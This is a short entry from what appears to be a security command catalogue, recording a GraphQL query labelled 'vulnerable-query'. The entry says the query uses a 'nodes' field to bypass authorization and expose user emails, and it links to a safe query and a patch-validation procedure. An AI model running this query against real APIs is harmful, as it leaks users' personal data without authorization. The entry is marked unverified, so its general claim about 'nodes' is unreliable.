---
data: |-
  query {
    users() {
      nodes {
        email
      }
    }
  }
tags:
  - graphql
  - vulnerable-query
type: command
executor: graphql
platforms:
  - Web
id: 44f08fa8-d325-42b8-bd25-7801b238b446
created_at: '2025-12-11T06:10:40.208Z'
updated_at: '2025-12-11T06:10:40.208Z'
verified: false
validated: true
submitted: true
---
# graphql-vulnerable-query-nodes

## Command

```graphql
query {
  users() {
    nodes {
      email
    }
  }
}
```

## Description

This GraphQL query uses the 'nodes' field to bypass authorization, exposing sensitive data like emails.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `users()` | Connection to query users | Yes |
| `nodes` | Field that bypasses authorization | Yes |
| `email` | Attribute to fetch | No |

## Examples

### Basic Usage

```graphql
query {
  users() {
    nodes {
      email
    }
  }
}
```

## Expected Output

Unauthorized sensitive user email data.

## Related

- [[commands/graphql-safe-query-edges]]
- [[procedures/Validate-GraphQL-Patch-Effectiveness]]
